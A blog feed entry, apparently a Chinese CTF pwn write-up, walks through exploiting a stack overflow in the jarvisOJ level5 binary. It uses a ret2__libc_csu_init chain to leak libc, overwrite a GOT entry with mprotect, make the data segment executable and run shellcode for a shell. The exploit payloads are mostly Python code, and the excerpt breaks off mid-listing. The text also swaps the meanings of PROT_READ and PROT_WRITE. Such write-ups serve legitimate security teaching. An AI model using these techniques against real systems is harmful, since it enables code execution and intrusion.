<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cyberangel-blog</title>
  
  
  <link href="https://cyberangel.cn/atom.xml" rel="self"/>
  
  <link href="https://cyberangel.cn/"/>
  <updated>2021-07-04T09:57:11.458Z</updated>
  <id>https://cyberangel.cn/</id>
  
  <author>
    <name>Cyberangel</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>利用mprotect修改程序段权限为可执行</title>
    <link href="https://cyberangel.cn/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/"/>
    <id>https://cyberangel.cn/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/</id>
    <published>2021-06-10T07:59:46.000Z</published>
    <updated>2021-07-04T09:57:11.458Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h1><p>链接: <a href="https://pan.baidu.com/s/1DPNwOCC-K0QkeP6cLkyS5g">https://pan.baidu.com/s/1DPNwOCC-K0QkeP6cLkyS5g</a>   密码: 3g0o<br>–来自百度网盘超级会员 V4 的分享</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在的大部分程序都会在编译时开启 NX 保护，这样我们就无法向 stack 上注入 shellcode 从而获得一个 shell；但是我们可以使用 mprotect 修改某个程序段的权限从而让这个段可执行，我们使用下面的题目来举个例子：<a href="https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ/jarvisOJ_level5">https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ/jarvisOJ_level5</a><br>参考资料：<a href="https://www.dazhuanlan.com/2019/12/19/5dfb1fdeb7ee5/">https://www.dazhuanlan.com/2019/12/19/5dfb1fdeb7ee5/</a></p><blockquote><p>之前学的__libc_csu_init 全忘完了，看了好长时间才想起来……</p></blockquote><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>文件下载下来按照惯例检查一下文件的保护：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623312426167-209eb77f-3e13-4bc9-ba92-3d930175ad06.png#height=298&id=NGKbh&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%2016.07.02.png&originHeight=298&originWidth=1772&originalType=binary%E2%88%B6=1&size=60200&status=done&style=none&width=1772" alt="截屏2021-06-10 16.07.02.png"><br>为了方便之后的调试，这里选择关闭 Linux 的 ALSR：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623312445342-05ca4b60-9548-46c4-a7d8-1d488bbbd021.png#height=216&id=wQ5fE&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%2016.07.20.png&originHeight=216&originWidth=2170&originalType=binary%E2%88%B6=1&size=49016&status=done&style=none&width=2170" alt="截屏2021-06-10 16.07.20.png"><br>其实这道题是完全可以使用 ret2__libc_csu_init 加上 system(“/bin/sh\x00”)来做，但是现在我们提一个要求：“假设 system 和 execve 函数被禁用，请尝试使用 mmap 和 mprotect 完成本题。”</p><blockquote><p>当然这个程序并没有加什么类似于 sandbox 之类的保护，但是为了凸显 mprotect 在这道题的用法，我们默认这两个函数已经被 ban</p></blockquote><p>这里选用函数 mprotect 来更改 bss 的权限，看一下更改之前和之后的效果，更改之前：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623312825943-40df5f1c-8848-40e6-84f7-fab6d2033f0f.png#height=830&id=S6Imb&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%2016.13.42.png&originHeight=830&originWidth=2210&originalType=binary%E2%88%B6=1&size=210415&status=done&style=none&width=2210" alt="截屏2021-06-10 16.13.42.png"><br>更改之后：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623312982676-7adbbde5-b5a9-4ce4-b440-c8cc56f55091.png#height=842&id=hYTfO&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%2016.16.17.png&originHeight=842&originWidth=2012&originalType=binary%E2%88%B6=1&size=242713&status=done&style=none&width=2012" alt="截屏2021-06-10 16.16.17.png"><br>从这两张图中可以看出，程序的 data 段已经可以变为可执行（注意：bss 段只是程序 data 段的一小部分）。言归正传，先来看一下程序的 main 吧，main 函数很简单：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623313219156-2124fb07-1b66-4f2c-9da1-07f7f3108df7.png#height=186&id=gNJu3&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%2016.20.15.png&originHeight=186&originWidth=1246&originalType=binary%E2%88%B6=1&size=41707&status=done&style=none&width=1246" alt="截屏2021-06-10 16.20.15.png"><br>进入程序的 vulnerable_function 函数：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623313270853-4bae1a71-19fc-477e-ba69-742e66695e09.png#height=236&id=Y5azc&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%2016.21.07.png&originHeight=236&originWidth=1624&originalType=binary%E2%88%B6=1&size=51056&status=done&style=none&width=1624" alt="截屏2021-06-10 16.21.07.png"><br>有一个 stack overflow，另外程序中没有 system 函数和”/bin/sh\x00”字符串。常规思路，在泄露 libc 的基地址之前看一下程序中可以使用的 gadget：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623390333590-07544557-86a7-49d6-b7f8-8db4d692799f.png#height=630&id=fR8KE&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%2013.45.29.png&originHeight=630&originWidth=2748&originalType=binary%E2%88%B6=1&size=125314&status=done&style=none&width=2748" alt="截屏2021-06-11 13.45.29.png"><br>这个程序的 gadget 比较少，想要劫持程序流的话可能不太容易，但是这个程序是 64 位程序我们可以使用 ret2<strong>libc_csu_init，其核心在于每个 ELF 64-bit 文件中都肯定有这样一段 gadget：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623390544148-221107c5-2c45-442f-b544-3b47763a692a.png#height=600&id=CelT0&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%2013.48.59.png&originHeight=600&originWidth=1816&originalType=binary%E2%88%B6=1&size=210655&status=done&style=none&width=1816" alt="截屏2021-06-11 13.48.59.png"><br>首先利用程序的栈溢出布置 stack 并将程序的流程劫持到</strong>libc_csu_init 的 0x4006AA 地址处：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret=<span class="number">0x4006b3</span> <span class="comment">#rdi, rsi, rdx</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x4006b1</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret=<span class="number">0x4006AA</span></span><br><span class="line">mov_gadget=<span class="number">0x400690</span></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_plt_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_got_addr)</span><br><span class="line">main_addr=<span class="number">0x40061A</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got_addr)+p64(<span class="number">0x8</span>)+p64(write_got_addr)+p64(<span class="number">0x1</span>)+p64(mov_gadget)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line"><span class="comment">#payload1=&#x27;a&#x27;*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_got_addr)+p64(0x10)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)+p64(0xdeadbeef)*6+p64(main_addr)</span></span><br><span class="line"><span class="comment">#payload1=&#x27;a&#x27;*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_plt_addr)+p64(0x10)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)</span></span><br><span class="line">p.sendline(payload1)</span><br></pre></td></tr></table></figure><blockquote><p>64 位的 ELF 在默认情况下的传参方式是：<br>当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9；当参数为 7 个以上时， 前 6 个与前面一样， 但后面的依次放入栈中，即和 32 位程序一样。</p></blockquote><p>其实我们可以使用逆向思维来解题，因为要泄露 libc 基地址肯定要泄露某个函数在程序运行时的真实地址，而且在这个程序中只有 write 函数具有打印地址的功能，所以选择使用 write 函数泄露地址。并且由于这个程序是 64 位的，所以要注意给 write 函数的传参方式：write($rdi,$rsi,$rdx)；但是程序中只有 pop_rdi_ret 这个 gadget，没有 pop_rsi_ret 和 pop_rdx_ret 的 gadget，使用__libc_csu_init 可以帮我门走出困境，重点内容都标记到下面的代码框中了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400690</span> loc_400690:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400690</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400693</span>                 mov     rsi, r14               #可以通过控制r14寄存器间接控制rsi寄存器</span><br><span class="line">.text:<span class="number">0000000000400696</span>                 mov     edi, r15d  #可以通过控制r15寄存器的低<span class="number">32</span>位间接控制rdi寄存器的低<span class="number">32</span>位</span><br><span class="line">.text:<span class="number">0000000000400699</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]  #可以令rbx==<span class="number">0</span>，通过控制r12寄存器调用(call)某个函数</span><br><span class="line">.text:<span class="number">000000000040069</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000004006</span>A1                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">00000000004006</span>A4                 jnz     <span class="keyword">short</span> loc_400690       <span class="meta">#rbx和rbp“不相等则跳转”（继续从0x400690地址处执行）</span></span><br><span class="line">.text:<span class="number">00000000004006</span>A6</span><br><span class="line">.text:<span class="number">00000000004006</span>A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+<span class="number">36</span>↑j</span><br><span class="line">.text:<span class="number">00000000004006</span>A6                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004006</span>AA                 pop     rbx                    #这里可以通过pop来控制rbx、rbp、r12、r13、r14、r15寄存器</span><br><span class="line">.text:<span class="number">00000000004006</span>AB                 pop     rbp</span><br><span class="line">.text:<span class="number">00000000004006</span>AC                 pop     r12</span><br><span class="line">.text:<span class="number">00000000004006</span>AE                 pop     r13</span><br><span class="line">.text:<span class="number">00000000004006B</span>0                 pop     r14</span><br><span class="line">.text:<span class="number">00000000004006B</span>2                 pop     r15</span><br><span class="line">.text:<span class="number">00000000004006B</span>4                 retn</span><br></pre></td></tr></table></figure><p>先来看一下 payload1，我们分段来看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> <span class="comment">#栈溢出</span></span><br><span class="line">payload1+=p64(pop_rbx_rbp_r12_r13_r14_r15_ret) <span class="comment">#劫持程序流到pop_gadgets</span></span><br><span class="line">payload1+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#为了实现有且只有一次跳转，控制rbx==0，rbp==1；另外注意gadgets中有add rbx,1</span></span><br><span class="line">payload1+=p64(write_got_addr)+p64(<span class="number">0x8</span>)+p64(write_got_addr)+p64(<span class="number">0x1</span>) <span class="comment">#控制r12==write_got_addr;r13==0x8;r14==write_got_addr;r15==0x1</span></span><br><span class="line">payload1+=p64(mov_gadget)   <span class="comment">#间接控制：call write_got_addr;rdx==0x8;rsi==write_got_addr;edi==0x1</span></span><br><span class="line">    <span class="comment">#实现：write(0x1,write_got_addr,0x8)</span></span><br><span class="line">payload1+=p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)                          <span class="comment">#call write后由于不跳转会继续执行如下汇编：</span></span><br><span class="line"><span class="comment">################################################################################################################################################</span></span><br><span class="line">.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+<span class="number">36</span>↑j</span><br><span class="line">.text:00000000004006A6                 add     rsp, <span class="number">8</span>               <span class="comment">#p64(0xdeadbeef)抵消add rsp,8</span></span><br><span class="line">.text:00000000004006AA                 pop     rbx                  <span class="comment">#rbx、rbp、r12、r13、r14、r15经过pop后为0xdeadbeef</span></span><br><span class="line">.text:00000000004006AB                 pop     rbp</span><br><span class="line">.text:00000000004006AC                 pop     r12</span><br><span class="line">.text:00000000004006AE                 pop     r13</span><br><span class="line">.text:00000000004006B0                 pop     r14</span><br><span class="line">.text:00000000004006B2                 pop     r15</span><br><span class="line">.text:00000000004006B4                 retn                         <span class="comment">#p64(main_addr):pop rip，执行main函数</span></span><br></pre></td></tr></table></figure><p>强调一点，payload1 中 p64(0xdeadbeef)的数量为 7，不能多也不能少，其中第一个 p64(0xdeadbeef)的作用是抵消“add rsp,8”对 stack 的影响（栈的生长方向是由高地址到低地址【x86、x64】），再补充一个错误的 payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_plt_addr)+p64(<span class="number">0x10</span>)+p64(write_got_addr)+p64(<span class="number">0x1</span>)+p64(mov_gadget)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623396906959-e6713489-b988-4cf0-a044-9c59576e6b79.png#height=1800&id=skzVL&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%2015.34.59.png&originHeight=1800&originWidth=2880&originalType=binary%E2%88%B6=1&size=504973&status=done&style=none&width=2880" alt="截屏2021-06-11 15.34.59.png"><br>如上图所示，call 是一个错误的地址，正常的 payload 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got_addr)+p64(<span class="number">0x10</span>)+p64(write_got_addr)+p64(<span class="number">0x1</span>)+p64(mov_gadget)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623396819347-25bf33d3-349f-495f-9275-0ec2935a1d45.png#height=1800&id=QqOBh&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%2015.33.33.png&originHeight=1800&originWidth=2880&originalType=binary%E2%88%B6=1&size=546063&status=done&style=none&width=2880" alt="截屏2021-06-11 15.33.33.png"><br><strong>注意这里的 call 一定是函数的 got 地址而不是函数的 plt 地址，因为 call 是将当前 RIP 的下一条指令压入 stack 然后 jmp 到对应的地址，下图箭头指向的地方是一条 jmp 指令，我们不能去 call 一条 jmp 指令。（plt 中存放的是 jmp 指令）</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623397714399-9b620723-1ca0-43b7-aa58-aa156b2fdc13.png#height=1634&id=FnKhV&margin=%5Bobject%20Object%5D&name=QQ20210611-154803%402x.png&originHeight=1634&originWidth=2746&originalType=binary%E2%88%B6=1&size=340651&status=done&style=none&width=2746" alt="QQ20210611-154803@2x.png"><br>回到正题，这样我们就可以泄露出 write 函数的真实地址进而泄露出 libc 基地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(payload1)</span><br><span class="line">leak_write_real_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#print hex(leak_write_real_addr)</span></span><br><span class="line">libc_base=leak_write_real_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br></pre></td></tr></table></figure><p>仿照之前的步骤，return 到 gadgets 调用 read 函数向空内存的 bss 段读入 shellcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">read_got_addr=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(bss_addr)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got_addr)+p64(<span class="number">0x100</span>)+p64(bss_addr)+p64(<span class="number">0x0</span>)+p64(mov_gadget)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br></pre></td></tr></table></figure><p>我们都知道 got 表中存放的是函数的真实地址，由于要调用 mprotect 函数，因此我们可以将 mprotect 的真实地址写入到空的 got 中，这里选取 elf.got[‘<strong>gmon_start</strong>‘]：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623400487615-a221bc55-041d-4f29-8051-10afe1cd2766.png#height=382&id=IUrjg&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%2016.34.42.png&originHeight=382&originWidth=2752&originalType=binary%E2%88%B6=1&size=62670&status=done&style=none&width=2752" alt="截屏2021-06-11 16.34.42.png"><br>当某个函数调用之后，其真实地址会写入到 got 表中，所以上图一看就知道<strong>gmon_start</strong>没有执行过，所以说将其内存覆盖也没有什么关系。</p><blockquote><p>《Linux 程序符号<strong>gmon_start</strong>》：<a href="https://www.jianshu.com/p/ebd516326a36">https://www.jianshu.com/p/ebd516326a36</a></p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623400729364-3ed0226e-7cc6-4514-bb90-480cbd4def44.png#height=380&id=qlrsA&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%2016.38.44.png&originHeight=380&originWidth=1546&originalType=binary%E2%88%B6=1&size=133508&status=done&style=none&width=1546" alt="截屏2021-06-11 16.38.44.png"></p><blockquote><p>got 表中存放的是函数的真实地址。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">target_got=elf.got[<span class="string">&#x27;__gmon_start__&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> target_got</span><br><span class="line"><span class="comment">#payload3=&#x27;a&#x27;*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(read_got_addr)+p64(0x100)+p64(target_plt)+p64(0x0)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)</span></span><br><span class="line">payload3=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got_addr)+p64(<span class="number">0x100</span>)+p64(target_got)+p64(<span class="number">0x0</span>)+p64(mov_gadget)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">target=libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(target)</span><br><span class="line">p.sendline(p64(target))</span><br></pre></td></tr></table></figure><p>之后执行<strong>gmon_start</strong>，因为 got[‘<strong>gmon_start</strong>‘]已经被更改为 mprotect，所以这次执行相当于执行 mprotect【更改 data 段的权限为 0x7（可读可写可执行）（r=4，w=2，x=1）】：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(target_got)+p64(<span class="number">0x7</span>)+p64(<span class="number">0x1000</span>)+p64(bss_addr-<span class="number">0xa88</span>)+p64(mov_gadget)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.sendline(payload4)</span><br></pre></td></tr></table></figure><blockquote><p>程序段的映射是由 mmap 实现的，data 段也不例外。</p></blockquote><p>这里补充一下有关 mprotect 的知识，其函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mmap.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><p>作用：mprotect()函数把自 start 开始的、长度为 len 的内存区的保护属性修改为 prot 指定的值。</p><blockquote><p>prot 可以取以下几个值，并且可以用“|”将几个属性合起来使用：<br>1）PROT_READ：表示内存段内的内容可写；2）PROT_WRITE：表示内存段内的内容可读；<br>3）PROT_EXEC：表示内存段中的内容可执行；4）PROT_NONE：表示内存段中的内容无法访问；</p></blockquote><p>需要指出的是，<strong>区间开始的地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍：</strong></p><blockquote><p><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">https://man7.org/linux/man-pages/man2/mprotect.2.html</a></p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623402019544-f123475f-23a5-400d-9e1a-f89e003e6741.png#height=190&id=NsgGo&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%2017.00.13.png&originHeight=190&originWidth=1718&originalType=binary%E2%88%B6=1&size=62629&status=done&style=none&width=1718" alt="截屏2021-06-11 17.00.13.png"><br>返回值：如果执行成功，则返回 0；如果执行失败，则返回-1，并且设置 errno 变量。<br>错误的原因主要有以下几个：<br>1）EACCES：该内存不能设置为相应权限。这是可能发生的，比如，如果你  mmap(2)  映射一个文件为只读的，接着使用  mprotect()  标志为  PROT_WRITE。<br>2）EINVAL：start 不是一个有效的指针，指向的不是某个内存页的开头。<br>3）ENOMEM：内核内部的结构体无法分配。<br>4）ENOMEM：进程的地址空间在区间  [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。 <br><strong>如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生 SIGSEGV（Segmentation fault，段错误）信号，并且终止该进程。</strong><br>回到这道题，显而易见 mprotect 的第一个参数为 data 段的首地址即 bss_addr-0xa88，第二个参数 len 包含整个 data 段就行：0x1000，第三个参数设置为 0x7 即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(target_got)+p64(<span class="number">0x7</span>)+p64(<span class="number">0x1000</span>)+p64(bss_addr-<span class="number">0xa88</span>)+p64(mov_gadget)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br></pre></td></tr></table></figure><blockquote><p>另：因为内存是要求是以基页（4KB==0x1000Byte）为单位访问，所以 mprotect 的第一、第二个参数必须是 0x1000 的倍数。</p></blockquote><p>获取 Linux 内存页（基页）大小的命令为 getconf PAGE_SIZE：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623402456899-91c70e43-1dd7-404a-b1ef-670bf98a609d.png#height=126&id=nKS6H&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-11%2017.07.31.png&originHeight=126&originWidth=1756&originalType=binary%E2%88%B6=1&size=24700&status=done&style=none&width=1756" alt="截屏2021-06-11 17.07.31.png"><br>最后栈溢出执行 shellcode 拿到 shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload5=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(bss_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>完整 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span 